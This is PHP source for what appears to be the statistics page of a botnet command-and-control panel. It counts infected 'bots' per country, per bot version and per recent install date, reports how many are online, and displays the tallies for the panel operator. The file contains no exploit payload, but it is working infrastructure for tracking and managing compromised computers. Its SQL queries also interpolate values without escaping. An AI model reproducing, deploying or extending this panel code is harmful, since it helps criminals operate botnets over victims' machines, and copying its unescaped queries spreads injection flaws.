<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/functs.php";
	include_once ROOT_PATH."/mod/geo.php";
	if( !$user->Check() ) exit;

	Error_Reporting (E_ERROR | E_PARSE);
	refresh_bot_info();

	$icfg = $db->GetConfigs();
	$geoiphide = $icfg['bots_monitoring_geoip_hide'];

	if (intval($geoiphide) != 1) 
	{
		$res = $db->query("SELECT * FROM country_t ORDER BY name_country");
		$cnt = $db->affected_rows;
		if ($cnt > 0) 
		{
			$RES = Array();
			for ($i = 0; $mres = $res->fetch_array(); $i++) 
			{
				$idc = $mres['id_country'];
				$res2 = $db->query("SELECT count(id_bot) FROM bots_t WHERE (fk_city_bot IN (SELECT id_city FROM city_t, country_t 
						WHERE fk_country_city = id_country AND id_country = " . $idc . ")) AND (status_bot <> 'offline')");
				$actb_cnt = -1;
				if ((@($res2)) && $db->affected_rows > 0) 
				{
					$mres2 = $res2->fetch_array();
					$actb_cnt = $mres2[0];
				}

				$res2 = $db->query("SELECT count(id_bot) FROM bots_t WHERE fk_city_bot IN (SELECT id_city FROM city_t, country_t 
						WHERE fk_country_city = id_country AND id_country = " . $idc . ")");
				$allb_cnt = -1;
				if ((@($res2)) && $db->affected_rows > 0) 
				{
					$mres2 = $res2->fetch_array();
					$allb_cnt = $mres2[0];
					
					if (!$allb_cnt) 
					{
						$db->query("DELETE FROM city_t WHERE fk_country_city = " . $idc);
						continue;
					}					
				}
			  
				$idc = $idc;
				$ccode = 'null';
				$ccode = CountryCode($mres['name_country']);
				
				if (!$allb_cnt) continue;
				
				$RES[]=array('I'=>$i,'CCODE'=>$ccode,'MRES_NC'=>$mres['name_country'],'ACTB_CNT'=>$actb_cnt, 'ALLB_CNT'=>$allb_cnt, 'IDC'=>$idc);
			}
			$smarty->assign('CONT_ARR', $RES);
			//$smarty->display('botsmon_country.tpl');
		}
		else 
		{
			$smarty->display('botsmon_country.tpl');
			die();
		}
	}

	$res = $db->query("SELECT distinct ver_bot FROM bots_t ORDER BY ver_bot DESC");
	$RES2 = Array();
	for ($i = 0; $mres = $res->fetch_array(); $i++) 
	{
		$ver_bot = $mres['ver_bot'];
		
		$res2 = $db->query("SELECT count(*) FROM bots_t WHERE ver_bot = $ver_bot");
		if (!$res2 || !$db->affected_rows) continue;
		$mres2 = $res2->fetch_array(); 
		$cnta = $mres2[0];
		
		$res2 = $db->query("SELECT count(*) FROM bots_t WHERE ver_bot = $ver_bot AND status_bot = 'online'");
		if (!$res2 || !$db->affected_rows) continue;
		$mres2 = $res2->fetch_array(); 
		$cnto = $mres2[0];
		
		if (!$i) $RES2[] = "<tr align='center'><td>$ver_bot</td><td>$cnto / $cnta</td></tr>";
		else $RES2[] = "<tr align='center'><td><font style='color: red;'>$ver_bot</font></td><td>$cnto / $cnta</td></tr>";
	}
	$smarty->assign('CONT_ARR2', $RES2);

	$RES3 = Array();
	for ($i = -4; $i != 1; $i++) 
	{
		$day1 = $i;
		if ($day1 < 0) $date1 = "$day1 day";
		else if ($day1 > 0) $date1 = "+$day1 day";
		else $date1 = "now";
		//echo "date1 = '$date1'<br>";
		$date1 = strtotime($date1);
		$date1 = gmdate('Y.m.d', $date1);
		//echo "date1 = '$date1'<br>";
		$day2 = $i + 1;
		if ($day2 < 0) $date2 = "$day2 day";
		else if ($day2 > 0) $date2 = "+$day2 day";
		else $date2 = "now";
		//echo "date2 = '$date2'<br>";
		$date2 = strtotime($date2);
		$date2 = gmdate('Y.m.d', $date2);
		//echo "date2 = '$date2'<br>";
		
		$sql = "SELECT count(*) FROM bots_t WHERE date_install_bot >= '$date1' AND date_install_bot <= '$date2'";
		//echo "sql = '$sql'<br>";
		$res2 = $db->query($sql);
		if (!$res2 || !$db->affected_rows) continue;
		$mres2 = $res2->fetch_array(); 
		$cnta = $mres2[0];
		
		$sql = "SELECT count(*) FROM bots_t WHERE date_install_bot >= '$date1' AND date_install_bot <= '$date2' AND status_bot = 'online'";
		//echo "sql = '$sql'<br>";
		$res2 = $db->query($sql);
		if (!$res2 || !$db->affected_rows) continue;
		$mres2 = $res2->fetch_array(); 
		$cnto = $mres2[0];
		
		$RES3[] = "<tr align='center'><td>$date1</td><td>$cnto / $cnta</td></tr>";
	}
	$smarty->assign('CONT_ARR3', $RES3);
	$smarty->display('botsmon_country.tpl');
?>
